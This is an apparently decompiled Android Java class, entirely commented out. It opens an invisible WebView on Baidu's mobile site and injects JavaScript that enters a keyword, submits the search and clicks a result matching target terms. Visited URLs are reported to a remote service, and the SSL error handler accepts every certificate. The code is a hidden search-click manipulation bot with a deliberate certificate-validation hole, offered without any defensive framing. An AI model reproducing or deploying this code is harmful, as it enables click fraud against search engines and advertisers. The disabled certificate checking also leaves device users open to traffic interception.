package com.szcheba.baidutdk;

import android.app.Dialog;
import android.content.Context;
import android.net.http.SslError;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.graphics.Bitmap;
import android.webkit.SslErrorHandler;

public class Baidu {
	/*public static void a(Context paramContext, String keyword, String[] keywords,a parama) {
		WebView localWebView = new WebView(paramContext);
		WebSettings localWebSettings = localWebView.getSettings();
		localWebSettings.setJavaScriptEnabled(true);
		localWebSettings.setPluginState(WebSettings.PluginState.ON);
		localWebSettings.setAllowFileAccess(true);
		localWebSettings.setDomStorageEnabled(true);
		//localWebSettings.setUserAgentString(paramb.l);
		localWebView.loadUrl("http://wap.baidu.com");
		
		Dialog mDialog=new Dialog(paramContext);
		mDialog.setContentView(localWebView);
		mDialog.show();
		mDialog.hide();
		
		ParamFun localb = new ParamFun(localWebView, parama);
		localWebView.addJavascriptInterface(localb, "jsj");
		final String str1 = keyword;
		final String[] arrayOfString = keywords;
		long l1 = 3000L;
		final long l2 = l1;
		localWebView.setWebViewClient(new WebViewClient() {
			int a = 0;

			@Override
			public void onPageStarted(WebView paramWebView, String paramString,
					Bitmap paramBitmap) {
				super.onPageStarted(paramWebView, paramString, paramBitmap);
				if(BaseInfo.openLog)
					Log.e("test","onPageStarted#" + this.a + "#" + paramString);
			}

			@Override
			public void onPageFinished(WebView paramWebView, String paramString) {
				StringBuffer localStringBuffer;
				int i;
				int j;
				String str;
				super.onPageFinished(paramWebView, paramString);
				//if(paramString.indexOf("szcheba")>0)
					WebService.SendCallUrlState("onPageFinished:"+paramString);
				if(BaseInfo.openLog)
					Log.e("test","onPageFinished: " + this.a + "#" + paramString);
				if (this.a == 0) {
					localStringBuffer = new StringBuffer(
							"var newscript = document.createElement('script');");
					localStringBuffer.append("newscript.innerHTML = '");
					//localStringBuffer.append("jsj.Log(\\'1111111111111111111111\\');");
					localStringBuffer
							.append("var kw = document.getElementById(\\'index-kw\\');");
					localStringBuffer.append("kw.value = \\'").append(str1)
							.append("\\';");
					localStringBuffer
							.append("document.getElementById(\\'index-bn\\').click();");
					localStringBuffer.append("';");
					localStringBuffer
							.append("document.body.appendChild(newscript);");
					paramWebView.loadUrl("javascript:"
							+ localStringBuffer.toString());
					this.a += 1;
				} else {
					localStringBuffer = new StringBuffer(
							"var newscript = document.createElement('script');");
					localStringBuffer.append("newscript.innerHTML = '");
					//localStringBuffer.append("jsj.Log(\\'222222222222222222222\\');");
					localStringBuffer
							.append("var tt = document.getElementById(\\'results\\').childNodes;");
					localStringBuffer.append("var bool = false;");
					localStringBuffer.append("var first;");
					localStringBuffer.append("var ttf;");
					//localStringBuffer.append("jsj.Log(\\'tt.length:\\'+tt.length);");	//打印内容长度
					localStringBuffer.append("for (i=0; i<tt.length; i++){");
					localStringBuffer.append("var out = tt[i].outerHTML;");
					localStringBuffer.append("if(out){");
					//localStringBuffer.append("jsj.Log(out);");	//打印内容
					localStringBuffer
							.append("if(!first){ if(tt[i].childNodes[0].childNodes[0]){first=tt[i].childNodes[0].childNodes[0].href; ttf=tt[i].childNodes[0].childNodes[0].textContent;}}");
					localStringBuffer.append("if(");
					i = arrayOfString.length;
					for (j = 0; j < i; ++j) {
						str = arrayOfString[j];
						localStringBuffer.append("out.indexOf(\\'" + str
								+ "\\')!=-1 || ");
					}
					if (arrayOfString.length > 0)
						localStringBuffer.delete(
								localStringBuffer.length() - 3,
								localStringBuffer.length());
					localStringBuffer.append("){");
					//localStringBuffer
					//		.append("jsj.fail(200, tt[i].childNodes[0].childNodes[0].textContent);");
					localStringBuffer
							.append("tt[i].childNodes[0].childNodes[0].click();");
					localStringBuffer.append("bool = true;");
					localStringBuffer.append("break;");
					localStringBuffer.append("}");
					localStringBuffer.append("}");
					localStringBuffer.append("}");
					localStringBuffer.append("if(!bool){");
					//localStringBuffer.append("jsj.fail(201, ttf);");
					localStringBuffer.append("first.click();");
					localStringBuffer.append("}");
					localStringBuffer.append("';");
					localStringBuffer
							.append("document.body.appendChild(newscript);");
					paramWebView.loadUrl("javascript:"
							+ localStringBuffer.toString());
					this.a += 1;
				}
			}

			@Override
			public void onReceivedError(WebView view,
					int errorCode, String description,
					String failingUrl) {
				super.onReceivedError(view, errorCode, description, failingUrl);
				if(BaseInfo.openLog)
					Log.e("test", "error:" + description + ";url:" + failingUrl);
			}

			@Override
			public void onReceivedSslError(WebView view,
					SslErrorHandler handler, SslError error) {
				handler.proceed(); // 接受所有网站的证书
				super.onReceivedSslError(view, handler, error);
			}
		});

	}

	public static final class ParamFun {
		WebView a;
		Baidu.a c;
		boolean d = false;
		private Handler e = new Handler() {
			public void handleMessage(Message paramMessage) {
				if (paramMessage.what == 1000) {
					c.fail(paramMessage.arg1, (String) paramMessage.obj);
				}
			}
		};

		public ParamFun(WebView paramWebView,Baidu.a parama) {
			this.a = paramWebView;
			this.c = parama;
		}
		
		@JavascriptInterface
		public void Log(String log)
		{
			WebService.SendCallUrlState(log);
			if(BaseInfo.openLog)
				Log.e("test",log);
		}

		@JavascriptInterface
		public void fail(int paramInt, String paramString) {
			
			//if (!(this.d)) 
			{
				Message localMessage = new Message();
				localMessage.what = 1000;
				localMessage.arg1 = paramInt;
				localMessage.obj = paramString;
				this.e.sendMessage(localMessage);
			}
		}
	}

	public static abstract interface a {
		public abstract void fail(int paramInt, String paramString);
	}*/
}
